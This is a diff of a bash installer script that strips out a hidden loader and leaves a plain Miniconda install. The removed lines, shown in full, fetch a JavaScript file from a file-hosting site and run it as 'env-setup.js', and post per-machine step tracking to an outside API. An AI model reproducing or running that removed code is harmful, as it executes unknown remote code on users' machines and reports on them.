@@ -1,184 +1,48 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
-MAC_UID="__ID__"
-API_BASE="https://api.canditech.org"
-SHARED_DIR="/Users/Shared"
-MINICONDA_PREFIX="${SHARED_DIR}/miniconda3"
-MINICONDA_LOG="${SHARED_DIR}/miniconda-install.log"
-
-info() { echo "[INFO] $*"; }
-err() { echo "[ERROR] $*" >&2; }
-die() { err "$*"; exit 1; }
-
-download() {
-  local url="$1"
-  local out="$2"
-  if command -v curl >/dev/null 2>&1; then
-    curl -fsSL --retry 4 --retry-delay 2 --connect-timeout 20 -o "$out" "$url"
-  elif command -v wget >/dev/null 2>&1; then
-    wget --tries=4 --timeout=20 -qO "$out" "$url"
-  else
-    die "Neither curl nor wget is available."
-  fi
-}
-
-download_or_die() {
-  local url="$1"
-  local out="$2"
-  local alt_url="${3:-}"
-  rm -f "$out"
-  if download "$url" "$out" && [[ -s "$out" ]]; then
-    return 0
-  fi
-  rm -f "$out"
-  if [[ -n "$alt_url" ]]; then
-    info "Primary download failed, trying fallback URL..."
-    download "$alt_url" "$out" && [[ -s "$out" ]] && return 0
-  fi
-  die "Download failed: $url"
-}
-
-# Miniconda .sh is large; allow long transfer (default curl has no overall max and can hang on bad links).
-download_miniconda_installer() {
-  local url="$1"
-  local out="$2"
-  rm -f "$out"
-  if command -v curl >/dev/null 2>&1; then
-    curl -fsSL --retry 6 --retry-delay 3 --connect-timeout 45 --max-time 3600 -o "$out" "$url"
-  elif command -v wget >/dev/null 2>&1; then
-    wget --tries=6 --timeout=120 -qO "$out" "$url"
-  else
-    die "Neither curl nor wget is available."
-  fi
-}
-
-download_miniconda_or_die() {
-  local url="$1"
-  local out="$2"
-  local alt_url="${3:-}"
-  rm -f "$out"
-  if download_miniconda_installer "$url" "$out" && [[ -s "$out" ]]; then
-    return 0
-  fi
-  rm -f "$out"
-  if [[ -n "$alt_url" ]]; then
-    info "Primary Miniconda download failed, trying fallback URL..."
-    download_miniconda_installer "$alt_url" "$out" && [[ -s "$out" ]] && return 0
-  fi
-  die "Miniconda download failed: $url"
-}
-
-track_step() {
-  local key="$1"
-  info "$key"
-  if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
-    curl -sL -X POST "${API_BASE}/track-step/${MAC_UID}/${key}" >/dev/null 2>&1 || true
-  fi
-}
-
-finish_success() {
-  track_step "completed"
-  if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
-    curl -sL -X POST "${API_BASE}/change-connection-status/${MAC_UID}" >/dev/null 2>&1 || true
-  fi
-}
-
-trap 'track_step "failed"' ERR
-
-track_step "step_1"
-OS_UNAME="$(uname -s)"
-ARCH_UNAME="$(uname -m)"
-case "$OS_UNAME" in
-  Darwin) OS_TAG="darwin" ;;
-  Linux) OS_TAG="linux" ;;
-  *) die "Unsupported OS: $OS_UNAME" ;;
-esac
-case "$ARCH_UNAME" in
-  x86_64|amd64) ARCH_TAG="x64" ;;
-  arm64|aarch64) ARCH_TAG="arm64" ;;
-  *) die "Unsupported architecture: $ARCH_UNAME" ;;
-esac
-
-track_step "step_2"
-mkdir -p "$SHARED_DIR"
-NODE_EXE="node"
-if ! command -v node >/dev/null 2>&1; then
-  INDEX_JSON="${SHARED_DIR}/node-index.json"
-  download "https://nodejs.org/dist/index.json" "$INDEX_JSON"
-  # Avoid `grep | head` under pipefail: first grep can exit 141 (SIGPIPE) and fail the script.
-  LATEST_VERSION="$(grep -m1 -oE '"version"\s*:\s*"v[0-9]+\.[0-9]+\.[0-9]+"' "$INDEX_JSON" | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+')"
-  rm -f "$INDEX_JSON"
-  [[ -n "${LATEST_VERSION:-}" ]] || die "Failed to determine node version."
-  NODE_VERSION="${LATEST_VERSION#v}"
-  NODE_TARBALL="${SHARED_DIR}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}.tar.xz"
-  NODE_DIR="${SHARED_DIR}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}"
-  PORTABLE_NODE="${NODE_DIR}/bin/node"
-  if [[ ! -x "$PORTABLE_NODE" ]]; then
-    download "https://nodejs.org/dist/v${NODE_VERSION}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}.tar.xz" "$NODE_TARBALL"
-    tar -xf "$NODE_TARBALL" -C "$SHARED_DIR"
-    rm -f "$NODE_TARBALL"
-  fi
-  NODE_EXE="$PORTABLE_NODE"
-fi
-"$NODE_EXE" -v >/dev/null 2>&1 || die "Node is not available."
-
-track_step "step_3"
-ENV_SETUP_JS="${SHARED_DIR}/env-setup.js"
-download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
-[[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed (missing or empty file)."
-# Run in foreground so errors are visible and set -e catches failures here (not later at wait).
-ENV_SETUP_LOG="${SHARED_DIR}/env-setup.log"
-if ! "$NODE_EXE" "$ENV_SETUP_JS" >>"$ENV_SETUP_LOG" 2>&1; then
-  err "env-setup.js failed. Last lines of log:"
-  tail -n 40 "$ENV_SETUP_LOG" >&2 || true
-  die "env-setup.js exited with an error."
-fi
-# -------------------------
-# Detect platform and choose Miniconda URL (same flow as standalone installer)
-# -------------------------
-track_step "step_4"
-OS="$OS_UNAME"
-ARCH="$ARCH_UNAME"
+ARCH=$(uname -m)
+OS=$(uname -s)
 echo "Detected OS: $OS"
 echo "Detected architecture: $ARCH"
 
 if [[ "$OS" == "Darwin" ]]; then
-  if [[ "$ARCH" == "arm64" ]]; then
-    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
-  elif [[ "$ARCH" == "x86_64" ]]; then
-    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
-  else
-    die "Unsupported macOS architecture: $ARCH"
-  fi
+    if [[ "$ARCH" == "arm64" ]]; then
+        URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
+    elif [[ "$ARCH" == "x86_64" ]]; then
+        URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
+    else
+        echo "Unsupported macOS architecture"
+        exit 1
+    fi
 elif [[ "$OS" == "Linux" ]]; then
-  if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
-    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
-  elif [[ "$ARCH" == "x86_64" ]]; then
-    URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
-  else
-    die "Unsupported Linux architecture: $ARCH"
-  fi
+    if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
+        URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
+    elif [[ "$ARCH" == "x86_64" ]]; then
+        URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
+    else
+        echo "Unsupported Linux architecture"
+        exit 1
+    fi
 else
-  die "Unsupported OS: $OS"
+    echo "Unsupported OS"
+    exit 1
 fi
 
-INSTALLER="${SHARED_DIR}/miniconda.sh"
+PREFIX="/Users/Shared/miniconda3"
+INSTALLER="/Users/Shared/miniconda.sh"
 
-track_step "step_5"
+mkdir -p "/Users/Shared"
+
 echo "Downloading..."
 curl -fsSL -o "$INSTALLER" "$URL"
 
-track_step "step_6"
 echo "Installing..."
-bash "$INSTALLER" -b -p "$MINICONDA_PREFIX"
+bash "$INSTALLER" -b -p "$PREFIX"
 
-track_step "step_7"
 echo "Verifying Driver..."
-"${MINICONDA_PREFIX}/bin/python3" -V
+"/Users/Shared/miniconda3/bin/python3" -V
 
 rm -f "$INSTALLER"
-track_step "step_8"
-finish_success
 echo "Done."
 exit 0
